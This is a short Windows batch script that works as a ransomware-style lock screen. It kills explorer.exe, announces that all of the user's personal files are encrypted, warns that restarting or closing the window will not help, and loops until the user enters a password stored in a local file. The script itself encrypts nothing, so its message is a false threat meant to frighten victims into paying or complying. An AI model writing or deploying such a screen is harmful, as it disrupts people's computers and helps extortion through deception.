@echo off
color 2
title YOUR FILES ARE ENCRYPTED!

cd saved
set /p FINALPASSWORD=<password.txt
cd ..

taskkill /f /im explorer.exe
cls
echo.
echo Hello %USERNAME%,
echo ALL YOUR PERSONAL FILES ARE ENCRYPTED. YOU NEED THE VALID PRIVATE KEY TO UNLOCK ALL FILES!
echo.
echo.
echo WARNING:
echo 	- Restarting your PC will keep your files encrypted!
echo 	- Closing this window will also keep your files encrypted!
echo.
echo.

set /p INPUTPASSWD=	Enter the keys password to unlock:
if %INPUTPASSWD%==%FINALPASSWORD% goto finish
goto wrong

:wrong
cls
echo %INPUTPASSWD% is wrong! Try again.
set /p INPUTPASSWD=	Enter the keys password to unlock:
if %INPUTPASSWD%==%FINALPASSWORD% goto finish
goto wrong

:finish
cls
echo.
echo Password was right.
echo Restoring files...
TIMEOUT 5 >nul
echo.
echo All files are restore!
start explorer.exe
taskkill /f /im cmd.exe
pause